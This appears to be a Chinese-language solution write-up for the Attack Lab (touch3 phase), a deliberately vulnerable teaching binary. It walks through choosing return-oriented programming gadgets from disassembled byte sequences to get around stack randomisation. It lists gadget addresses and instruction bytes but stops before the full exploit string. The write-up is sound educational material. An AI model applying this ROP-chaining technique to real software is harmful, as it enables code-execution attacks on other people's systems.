因为每次栈的位置是随机的，所以无法直接用地址来索引字符串的起始地址，只能用栈顶地址 + 偏移量来索引字符串的起始地址。从farm中我们可以获取到这样一个gadget，lea (%rdi,%rsi,1),%rax，这样就可以把字符串的首地址传送到%rax。

解题思路：

（1）首先获取到%rsp的地址，并且传送到%rdi
（2）其二获取到字符串的偏移量值，并且传送到%rsi
（3）lea (%rdi,%rsi,1),%rax, 将字符串的首地址传送到%rax, 再传送到%rdi
（4）调用touch3函数

(1) 第一步，获取到%rsp的地址

0000000000401a03 <addval_190>:
  401a03: 8d 87 41 48 89 e0     lea    -0x1f76b7bf(%rdi),%eax
  401a09: c3  
movq %rsp, %rax的指令字节为：48 89 e0, 所以这一步的gadget地址为：0x401a06

(2) 第二步，将%rax的内容传送到%rdi

00000000004019a0 <addval_273>:
  4019a0: 8d 87 48 89 c7 c3     lea    -0x3c3876b8(%rdi),%eax
  4019a6: c3
movq %rax, %rdi的指令字节为：48 89 c7，所以这一步的gadget地址为：0x4019a2

(3) 第三步，将偏移量的内容弹出到%rax


00000000004019ca <getval_280>:
  4019ca: b8 29 58 90 c3        mov    $0xc3905829,%eax
  4019cf: c3   
popq %rax的指令字节为：58， 其中90为nop指令, 所以这一步的gadget地址为：0x4019cc

(4) 第四步，将%eax的内容传送到%edx

00000000004019db <getval_481>:
  4019db: b8 5c 89 c2 90        mov    $0x90c2895c,%eax
  4019e0: c3    
movl %eax, %edx的指令字节为:89 c2, 所以这一步的gadget地址为：0x4019dd

(5) 第五步，将%edx的内容传送到%ecx

0000000000401a6e <setval_167>:
  401a6e: c7 07 89 d1 91 c3     movl   $0xc391d189,(%rdi)
  401a74: c3  
movl %edx, %ecx的指令字节为：89 d1，所以这一步的gadget地址为：0x401a70

(6) 第六步，将%ecx的内容传送到%esi

0000000000401a11 <addval_436>:
  401a11: 8d 87 89 ce 90 90     lea    -0x6f6f3177(%rdi),%eax
  401a17: c3                    retq 
movl %ecx, %esi的指令字节为：89 ce, 所以这一步gadget地址为：0x401a13

(7) 第七步，将栈顶 + 偏移量得到字符串的首地址传送到%rax

00000000004019d6 <add_xy>:
  4019d6: 48 8d 04 37           lea    (%rdi,%rsi,1),%rax
  4019da: c3                    retq 
这一步的gadget地址为：0x4019d6

(8) 将字符串首地址%rax传送到%rdi

00000000004019a0 <addval_273>:
  4019a0: 8d 87 48 89 c7 c3     lea    -0x3c3876b8(%rdi),%eax
  4019a6: c3
movq %rax, %rdi的指令字节为：48 89 c7，所以这一步的gadget地址为：0x4019a2
